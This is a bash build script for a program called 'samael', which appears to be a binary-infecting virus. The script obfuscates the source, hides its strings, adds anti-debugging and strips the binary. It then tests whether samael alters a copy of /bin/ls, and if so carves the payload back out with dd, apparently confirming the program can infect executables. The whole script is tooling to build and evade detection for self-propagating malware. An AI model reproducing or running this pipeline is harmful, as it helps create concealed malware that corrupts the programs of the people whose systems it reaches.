#!/bin/bash

if [[ "$1" == "clean" ]];
then
    rm -f samael test
    exit 0
fi

../tools/obfuscator/obfuscator.sh samael.c
../tools/obfuscator/obfuscator.sh samael.h
../tools/hide-strings/hide-strings.sh samael.c
../tools/hide-strings/hide-strings.sh samael.h
gcc -static samael.c -o samael
../tools/anti-debug/anti-debug.sh
./build.sh clean
gcc -static samael.c -o samael
strip --strip-all samael
mv samael.c.bak samael.c
mv samael.h.bak samael.h
cp /bin/ls ./test
samael_size=$(stat samael | grep Size: | cut -c -19 | cut -c 9-)
test_size_before=$(stat test | grep Size: | cut -c -19 | cut -c 9-)
./samael
test_size_after=$(stat test | grep Size: | cut -c -19 | cut -c 9-)
if [[ $test_size_after != $test_size_before ]]
then
    dd if=./test of=./samael bs=1 count=$samael_size 2> /dev/null
    chmod +x samael
    cp /bin/ls ./test
else
    ./build.sh
fi


